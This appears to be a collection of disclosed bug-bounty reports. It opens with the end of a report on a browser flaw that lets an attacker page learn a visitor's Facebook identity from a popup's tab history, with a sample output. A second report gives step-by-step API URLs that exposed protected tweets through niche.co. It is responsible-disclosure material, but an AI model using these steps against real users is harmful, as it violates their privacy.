This is done by opening a popup pointing to 'https://www.facebook.com/me' which will instantly redirect to 'https://www.facebook.com/{your name}' and then we redirect into a dummy page in order to create a history object.

Given that the user is not dragging directly from facebook.com then it is not the same as having a user copy paste or drag n drop their facebook URL. This is pretty much completely done within attacker controlled website.

## Supporting Material/References:

PoC attached.
Also, I wonder if something worse could happen messing with this object. I haven't been able to produce my own custom tabs yet, but if that is even theoretically possible then we 'theoretically' also have control of all the variables mentioned in the tab object.

Here is a sample of the output:
```
{"showOnRight":false,"security":{"isSecure":false,"runInsecureContent":false},"src":"about:blank","lastAccessedTime":1502356944847,"computedThemeColor":null,"guestInstanceId":44,"adblock":{},"partition":"persist:default","findDetail":{"searchString":"","caseSensitivity":false},"noScript":{},"endLoadTime":1502356942486,"navbar":{"urlbar":{"location":"http://localhost/wut.html","suggestions":{"selectedIndex":null,"searchResults":[],"suggestionList":null,"shouldRender":false},"selected":false,"focused":false,"active":false}},"trackingProtection":{},"tabId":322,"zoomLevel":0,"breakpoint":"default","partitionNumber":0,"history":["https://www.facebook.com/abdulrahman.alqabandi.3","https://www.facebook.com/abdulrahman.alqabandi.3","http://localhost/wut.html"],"audioMuted":false,"startLoadTime":1502356941347,"provisionalLocation":"https://www.facebook.com/abdulrahman.alqabandi.3","location":"http://localhost/wut.html","fingerprintingProtection":{},"httpsEverywhere":{},"audioPlaybackActive":false,"disposition":"new-popup","title":"localhost/wut.html","searchDetail":null,"icon":null,"isPrivate":false,"openerTabId":5,"parentFrameKey":null,"loading":false,"hrefPreview":"","unloaded":false,"key":1}
```

---

### [Unauthorized Access to Protected Tweets via niche.co API](https://hackerone.com/reports/273698)

- **Report ID:** `273698`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** X / xAI
- **Reporter:** @eidelweiss
- **Bounty:** - usd
- **Disclosed:** 2017-11-02T23:57:47.831Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

**Summary:**
Normally If user __(victim)__ set to private / protect their tweets in setting Tweet privacy, other people/user will not able to see their recent or their pass status/twits when they visit his/her __(victim)__ profile. people only can see their __(victim)__ profile images and information about __how many tweet already post by that user__ , __how many followers and following by that account__ and __how many likes__ etc etc. but i found a way to view the protected tweets from other user who protect their tweets.


**Description:** 
in your policy i see there is new domain add as in scope target , and the domain is `niche.co` .
there is some condition needed to success reproduce this vulnerability:
1. the __victim__ need to connect their twitter account with `niche.co`
2. use the `niche.co` API to Access the Protected Tweets

## Steps To Reproduce:
_victim side_
 * victim account is `https://twitter.com/dummysystems`
  * lets say the victim already set to protect his/her tweets via `https://twitter.com/settings/safety`
{F225673}
  * now when other user try to visit victim profile it will look like this
{F225670}
  * now visit `https://www.niche.co/get-started` and chose twitter , allow and or Authorize Niche to use your account and complete the rest (including confirming your email address).

_attacker side_
  1. attacker no need to have twitter account and or no need to have `Niche` account here , this made the severity is high
  1. just visit `https://www.niche.co/api/v1/users/[victim_twitter_account]` ( in this case the victim is https://www.niche.co/api/v1/users/dummysystems , the attacker will show some important information disclosure regarding the victim account
   {F225668}
  1. scroll down the page till you see something like this `/users/52667/posts?accounts=162059`
  {F225669}
  1. and open it, so the full URI will become `https://www.niche.co/api/v1//users/52667/posts?accounts=162059`
  1. and BOOM! the attacker now have Access to Protected Tweets from victim account.
{F225671}
{F225672}

**noted**
to follow the rules, I use my own account as the __victim__, so there is no other / real account has been compromised.


Regards,

---
